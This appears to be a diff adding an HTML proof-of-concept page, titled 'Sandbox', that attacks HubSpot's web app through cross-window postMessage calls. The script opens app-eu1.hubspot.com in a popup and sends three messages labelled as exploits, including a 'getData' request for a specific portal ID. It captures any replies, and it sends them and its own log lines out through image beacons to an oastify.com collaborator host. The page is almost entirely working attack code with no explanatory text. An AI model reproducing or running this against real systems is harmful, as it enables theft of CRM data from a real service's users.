@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head><title>Sandbox</title></head>
+<body>
+<h2>Sandbox Active</h2>
+<div id="log" style="font-family:monospace;font-size:12px;background:#000;color:#0f0;padding:10px;"></div>
+<script>
+const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+
+function log(msg) {
+    const logDiv = document.getElementById('log');
+    logDiv.innerHTML += '<br>' + msg;
+    new Image().src = EXFIL + '/?s=' + encodeURIComponent(msg);
+    console.log('[SANDBOX]', msg);
+}
+
+log('sandbox_script_running');
+log('window_origin=' + window.origin);
+
+// Open HubSpot
+log('attempting_to_open_hubspot');
+
+try {
+    let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
+    
+    if (!hub) {
+        log('ERROR_popup_blocked');
+    } else {
+        log('SUCCESS_popup_opened');
+        
+        // Poll until HubSpot loads
+        let attempts = 0;
+        let checker = setInterval(() => {
+            attempts++;
+            
+            try {
+                // Try to access origin - will throw error when cross-origin loads
+                let test = hub.origin;
+                
+                if (attempts % 10 === 0) {
+                    log('polling_attempt_' + attempts);
+                }
+            } catch(e) {
+                // Error means HubSpot has loaded (cross-origin)
+                clearInterval(checker);
+                log('hubspot_loaded_after_' + attempts + '_attempts');
+                log('error_message=' + e.message);
+                
+                // Listen for responses from HubSpot
+                window.addEventListener('message', function(resp) {
+                    log('RESPONSE_FROM=' + resp.origin);
+                    log('RESPONSE_TYPE=' + (resp.data.type || 'unknown'));
+                    
+                    // Exfiltrate the response
+                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 300));
+                });
+                
+                // Send Exploit 1: Content Assistance
+                setTimeout(() => {
+                    log('sending_exploit_1_CONTENT_ASSISTANCE');
+                    hub.postMessage({
+                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                        commandId: 'exploit123',
+                        featureId: 'test',
+                        parameters: {},
+                        resultCount: 1,
+                        language: 'en',
+                        objectId: '46962361',
+                        applicationId: 'crm',
+                        basePath: '/',
+                        maxPollingAttempts: 1,
+                        pollingInterval: 100
+                    }, '*');
+                }, 1000);
+                
+                // Send Exploit 2: Raw message
+                setTimeout(() => {
+                    log('sending_exploit_2_RAW');
+                    hub.postMessage({
+                        type: 'raw',
+                        _callbackId: 'exploit-456',
+                        body: {
+                            action: 'getData',
+                            portalId: '46962361'
+                        }
+                    }, '*');
+                }, 2000);
+                
+                // Send Exploit 3: Toggle Dark Mode (test)
+                setTimeout(() => {
+                    log('sending_exploit_3_DARK_MODE');
+                    hub.postMessage({
+                        type: 'TOGGLE_DARK_MODE',
+                        isDarkMode: true
+                    }, '*');
+                }, 3000);
+            }
+            
+            // Timeout after 100 attempts (10 seconds)
+            if (attempts > 100) {
+                clearInterval(checker);
+                log('TIMEOUT_after_100_attempts');
+            }
+        }, 100);
+    }
+} catch(err) {
+    log('CRITICAL_ERROR=' + err.message);
+}
+</script>
+</body>
+</html>
